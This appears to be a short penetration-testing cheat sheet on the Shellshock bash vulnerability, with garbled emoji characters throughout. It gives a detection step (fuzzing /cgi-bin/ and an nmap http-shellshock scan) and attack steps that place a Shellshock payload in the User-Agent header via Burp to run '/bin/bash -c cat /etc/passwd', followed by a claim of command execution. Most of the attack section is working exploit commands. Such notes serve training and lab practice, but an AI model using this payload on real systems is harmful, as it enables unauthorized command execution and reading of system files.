ð¤ð½ï¸ **<mark style="background: #FFF3A3A6;">Best Resource</mark>** â ð¥ï¸ [https://sirensecurity.io/blog/shellshock/](https://sirensecurity.io/blog/shellshock/) ð¥ï¸

- - -
## **DETECTION** ðï¸ ðï¸:

ð¡ï¸ Fuzz the **`/`** and **`/cgi-bin/`** **directory**, If any cgi or bash script found this is good.
ð¡ï¸ Lets **assume** we find something named â**gettime.cgi**â

```sh
nmap -sV $IP --script=http-shellshock --script-args âhttp-shellshock.uri=/gettime.cgiâ
```

![Imgur](https://i.imgur.com/D1orx2d.png)

- - -
## **ATTACKING STEPS** :

ð¡ï¸ð¡ï¸ visit to the **/gettime.cgi** and intercept it in burp, then send to reapeter.
ð¡ï¸ð¡ï¸ Remove the user-agent's data with this  : 
```sh
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```

ð¡ï¸ð¡ï¸ Now we have Command execution ! ! ! 

![Imgur](https://i.imgur.com/nSE8NRy.png)

- - -

